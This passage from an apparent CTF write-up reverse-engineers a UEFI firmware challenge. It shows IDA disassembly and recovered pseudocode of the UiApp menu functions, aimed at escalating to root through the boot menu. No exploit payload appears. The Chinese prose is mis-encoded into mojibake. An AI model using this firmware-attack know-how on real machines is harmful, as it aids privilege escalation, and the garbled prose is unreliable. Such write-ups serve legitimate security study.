usr</span><br><span class="line">/ $ <span class="built_in">cat</span> flag</span><br><span class="line"><span class="built_in">cat</span>: can<span class="string">&#x27;t open &#x27;</span>flag<span class="string">&#x27;: Permission denied</span></span><br><span class="line"><span class="string">/ $ whoami</span></span><br><span class="line"><span class="string">whoami: unknown uid 1000</span></span><br><span class="line"><span class="string">/ $ id</span></span><br><span class="line"><span class="string">uid=1000 gid=1000 groups=1000</span></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬å¯åŠ¨ run.py çš„æ—¶å€™æŒ‰ F12ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±ä¼šè¿›å…¥åˆ°ä¸€ä¸ªèœå•ç•Œé¢ï¼š  </p><img src="/2025/01/06/uefi2/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸èƒ½çŒœåˆ°æ¼æ´å°±åœ¨è¿™ä¸€ä¸ªèœå•ç•Œé¢ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡æ¼æ´æ¥å°†æƒé™æå‡è‡³ root ç„¶åè·å– flagã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯é€šè¿‡å¯¹æ¼æ´çš„åˆ©ç”¨æ¥æ‰“å¼€ Boot Managerï¼Œå¹¶åŠ å…¥è‡ªå·±çš„å¯åŠ¨é¡¹ä½¿ç”¨ root å¯åŠ¨ç³»ç»Ÿè¯»å‡º flagã€‚  </p><p>å…·ä½“å›ºä»¶çš„æå–è¿‡ç¨‹è§æˆ‘çš„ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://9anux.org/2024/12/14/uefi/">UEFI SMM æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨</a>ï¼Œé€šè¿‡å­—ç¬¦ä¸²çš„æœç´¢æˆ‘ä»¬èƒ½å¾ˆå®¹æ˜“çš„å®šä½åˆ°è¿™ä¸ªèœå•ç•Œé¢æ˜¯ç”±å›ºä»¶ UiApp å®ç°çš„ã€‚æˆ‘ä»¬å°†å…¶æ‹–è¿› ida ä¸­ä¼šå‘ç°å…¶éå¸¸éš¾çœ‹ï¼Œç¬¦å·è¡¨å…¨å»æ‰äº†ï¼Œè€Œä¸”æœ‰å¾ˆå¤šå‡½æ•°çš„å‚æ•°å¹¶æ²¡æœ‰ç»™è¯†åˆ«å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼ˆä¸‹é¢è¿™ä¸ªå‡½æ•°å·²ç»æ¢å¤äº†éƒ¨åˆ†ç¬¦å·ï¼‰ï¼š  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+20h] [rbp-140h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+28h] [rbp-138h]</span></span><br><span class="line">  __int16 v8[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(v2);</span><br><span class="line">  Input(v3, v6);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v9, v8, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(v4);</span><br><span class="line">  Input(v5, v7);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           v8,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           v10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° Output å’Œ Input çš„å‡½æ•°å‚æ•°å¹¶æ²¡æœ‰ç»™æ­£ç¡®çš„è¯†åˆ«ï¼Œç„¶åæˆ‘å»çœ‹è¿™ä¸ªå‡½æ•°çš„æ±‡ç¼–å¯»æ‰¾åŸå› ã€‚  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001CA1 Add             proc near               ; CODE XREF: vuln+CBâ†“p</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1 var_140         = qword ptr -140h</span><br><span class="line">.text:0000000000001CA1 var_130         = word ptr -130h</span><br><span class="line">.text:0000000000001CA1 var_110         = byte ptr -110h</span><br><span class="line">.text:0000000000001CA1 var_100         = byte ptr -100h</span><br><span class="line">.text:0000000000001CA1</span><br><span class="line">.text:0000000000001CA1                 endbr64</span><br><span class="line">.text:0000000000001CA5                 push    rbp</span><br><span class="line">.text:0000000000001CA6                 mov     rbp, rsp</span><br><span class="line">.text:0000000000001CA9                 sub     rsp, 160h</span><br><span class="line">.text:0000000000001CB0                 lea     rdi, aKeyName   ; &quot;Key name:&quot;</span><br><span class="line">.text:0000000000001CB7                 call    Output</span><br><span class="line">.text:0000000000001CBC                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CC3                 mov     esi, 10h        ; unsigned int</span><br><span class="line">.text:0000000000001CC8                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001CCB                 call    Input</span><br><span class="line">.text:0000000000001CD0                 lea     rdx, [rbp+var_130]</span><br><span class="line">.text:0000000000001CD7                 lea     rax, [rbp+var_110]</span><br><span class="line">.text:0000000000001CDE                 mov     r8d, 10h</span><br><span class="line">.text:0000000000001CE4                 mov     rcx, rax</span><br><span class="line">.text:0000000000001CE7                 call    Str2Unicode</span><br><span class="line">.text:0000000000001CEC                 lea     rdi, aKeyValue  ; &quot;Key value:&quot;</span><br><span class="line">.text:0000000000001CF3                 call    Output</span><br><span class="line">.text:0000000000001CF8                 lea     rax, [rbp+var_100]</span><br><span class="line">.text:0000000000001CFF                 mov     esi, 100h       ; unsigned int</span><br><span class="line">.text:0000000000001D04                 mov     rdi, rax        ; void *</span><br><span class="line">.text:0000000000001D07                 call    Input</span><br><span class="line">.text:0000000000001D0C                 mov     rax, cs:gRT</span><br><span class="line">.text:0000000000001D13                 mov     rsi, [rax+58h]</span><br><span class="line">.text:0000000000001D17                 lea     rax, [rbp+var_130]</span><br><span class="line">.text:0000000000001D1E                 lea     rdx, [rbp+var_100]</span><br><span class="line">.text:0000000000001D25                 mov     [rsp+160h+var_140], rdx</span><br><span class="line">.text:0000000000001D2A                 mov     r9d, 100h</span><br><span class="line">.text:0000000000001D30                 mov     r8d, 7</span><br><span class="line">.text:0000000000001D36                 lea     rdx, GUID</span><br><span class="line">.text:0000000000001D3D                 mov     rcx, rax</span><br><span class="line">.text:0000000000001D40                 call    rsi</span><br><span class="line">.text:0000000000001D42                 leave</span><br><span class="line">.text:0000000000001D43                 retn</span><br><span class="line">.text:0000000000001D43 Add             endp</span><br></pre></td></tr></table></figure><p>å‘ç° Input å’Œ Output çš„å‡½æ•°ä¼ å‚è§„åˆ™æ˜¯å’Œæˆ‘ä»¬å¹³æ—¶ linux ä¸­çš„ä¸€æ ·ï¼ˆrdiã€rsiã€rdxã€r8ã€r9ï¼‰ï¼Œè€Œ gRT ä¸Šçš„å‡½æ•°åˆ™æ˜¯ rcxã€rdxã€r8ã€r9<br>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬è¦åœ¨ ida ä¸Šæ‰‹åŠ¨æ¢å¤å…¶ä¼ å‚è§„åˆ™ï¼Œè¿™é‡Œçš„ä¿®æ”¹æ–¹å¼è¯»è€…è¯·è‡ªè¡Œç½‘ä¸Šæœç´¢ï¼Œè¿™é‡Œç»™å‡ºæˆ‘ä¿®æ”¹ Output å‡½æ•°çš„ demo  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __usercall <span class="title function_">Output</span><span class="params">(<span class="type">char</span> *@&lt;rdi&gt;)</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å¯¹ edk2 æºç çš„é˜…è¯»ï¼Œæˆ‘æ¢å¤äº†å¤§éƒ¨åˆ†çš„ç»“æ„ä½“ç»“æ„ï¼Œä¸‹é¢ç»™å‡ºæˆ‘æ¢å¤ç¬¦å·åçš„ ida ä¼ªä»£ç ã€‚</p><h3 id="æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç "><a href="#æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç " class="headerlink" title="æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç "></a>æ¢å¤äº†éƒ¨åˆ†ç¬¦å·çš„IDAä¼ªä»£ç </h3><h4 id="Run"><a href="#Run" class="headerlink" title="Run"></a>Run</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Run</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+28h] [rbp-38h] BYREF</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-28h] BYREF</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !byte_352B0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F250,</span><br><span class="line">           &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v4 = <span class="number">0</span>i64;</span><br><span class="line">    v6 = ((__int64 (__fastcall *)(<span class="type">size_t</span> (*)(<span class="type">void</span>), <span class="type">void</span> *, __int64 *))gBS-&gt;HandleProtocol)(</span><br><span class="line">           SystemTable-&gt;ConsoleOutHandle,</span><br><span class="line">           &amp;unk_2F240,</span><br><span class="line">           &amp;v3);</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0</span> )</span><br><span class="line">      v3 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_352B4 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">4</span>i64);</span><br><span class="line">      dword_352B8 = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + <span class="number">24</span>) + <span class="number">8</span>i64) + <span class="number">8</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (*(__int64 (__fastcall **)(__int64, _QWORD, __int64 *, __int64 *))(v3 + <span class="number">24</span>))(</span><br><span class="line">             v3,</span><br><span class="line">             *(<span class="type">int</span> *)(*(_QWORD *)(v3 + <span class="number">72</span>) + <span class="number">4</span>i64),</span><br><span class="line">             &amp;v2,</span><br><span class="line">             &amp;v1);</span><br><span class="line">      dword_352BC = v2;</span><br><span class="line">      dword_352C0 = v1;</span><br><span class="line">    &#125;</span><br><span class="line">    dword_352CC = sub_42ED(<span class="number">35</span>i64);</span><br><span class="line">    dword_352D0 = sub_42ED(<span class="number">36</span>i64);</span><br><span class="line">    dword_352C4 = dword_2F420;</span><br><span class="line">    dword_352C8 = dword_2F424;</span><br><span class="line">    byte_352B0 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))gBS-&gt;SetWatchdogTimer)(<span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64, <span class="number">0</span>i64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *))SystemTable-&gt;ConOut-&gt;ClearScreen)(SystemTable-&gt;ConOut);</span><br><span class="line">  v5 = sub_268F();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_935C() &amp;&amp; !v5 )</span><br><span class="line">    sub_92B3(</span><br><span class="line">      (__int64)<span class="string">&quot;/home/parallels/macOS/Desktop/edk2/edk2/MdeModulePkg/Application/UiApp/FrontPage.c&quot;</span>,</span><br><span class="line">      <span class="number">1155</span>i64,</span><br><span class="line">      (__int64)<span class="string">&quot;HiiHandle != ((void *) 0)&quot;</span>);</span><br><span class="line">  sub_25E0();</span><br><span class="line">  sub_11A4();</span><br><span class="line">  <span class="keyword">if</span> ( vuln() )</span><br><span class="line">  &#123;</span><br><span class="line">    Output(<span class="string">&quot;No No No!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_23A4(<span class="number">0</span>);</span><br><span class="line">    sub_11A4();</span><br><span class="line">    sub_2645();</span><br><span class="line">    sub_C6B3(v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="vuln"><a href="#vuln" class="headerlink" title="vuln"></a>vuln</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY1&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;BabyUefi&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">&quot;N&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">const</span> __int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">const</span> <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">    <span class="string">L&quot;N1CTF_KEY3&quot;</span>,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    <span class="number">7</span>i64,</span><br><span class="line">    <span class="number">8</span>i64,</span><br><span class="line">    <span class="string">&quot;mr.rtcl!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          menu();</span><br><span class="line">          v2 = inputNum();</span><br><span class="line">          <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          Add(v0);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        Delete(v0);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v2 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Get(v0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Encode(v0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x8000000000000003</span>ui64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Add"><a href="#Add" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+60h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>ui64);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  Output(<span class="string">&quot;Key value:&quot;</span>);</span><br><span class="line">  Input(Data, <span class="number">0x100</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, __int64, __int64, <span class="type">char</span> *))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">7</span>i64,</span><br><span class="line">           <span class="number">256</span>i64,</span><br><span class="line">           Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Delete</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+50h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v3, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v3, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (__fastcall *)(__int16 *, <span class="type">void</span> *, _QWORD, _QWORD, _QWORD))gRT-&gt;SetVariable)(</span><br><span class="line">           VariableName,</span><br><span class="line">           &amp;GUID,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64,</span><br><span class="line">           <span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Get"><a href="#Get" class="headerlink" title="Get"></a>Get</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">Get</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+30h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+3Ch] [rbp-134h] BYREF</span></span><br><span class="line">  __int16 VariableName[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Data[<span class="number">256</span>]; <span class="comment">// [rsp+70h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DataSize = <span class="number">256</span>i64;</span><br><span class="line">  Output(<span class="string">&quot;Key name:&quot;</span>);</span><br><span class="line">  Input(v4, <span class="number">0x10</span>u);</span><br><span class="line">  Str2Unicode((<span class="type">unsigned</span> __int8 *)v4, VariableName, <span class="number">0x10</span>ui64);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int16 *, <span class="type">void</span> *, <span class="type">char</span> *, __int64 *, <span class="type">char</span> *))gRT-&gt;GetVariable)(</span><br><span class="line">    VariableName,</span><br><span class="line">    &amp;GUID,</span><br><span class="line">    Attributes,</span><br><span class="line">    &amp;DataSize,</span><br><span class="line">    Data);</span><br><span class="line">  Output(<span class="string">&quot;Value: &quot;</span>);</span><br><span class="line">  Output(Data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Encode</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 GetVariableName[<span class="number">2</span>]; <span class="comment">// [rsp+3Ah] [rbp-166h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4Ah] [rbp-156h]</span></span><br><span class="line">  __int16 v4; <span class="comment">// [rsp+4Eh] [rbp-152h]</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// [rsp+50h] [rbp-150h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Attributes[<span class="number">4</span>]; <span class="comment">// [rsp+5Ch] [rbp-144h] BYREF</span></span><br><span class="line">  __int16 SetVariableName[<span class="number">16</span>]; <span class="comment">// [rsp+60h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">16</span>]; <span class="comment">// [rsp+80h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> 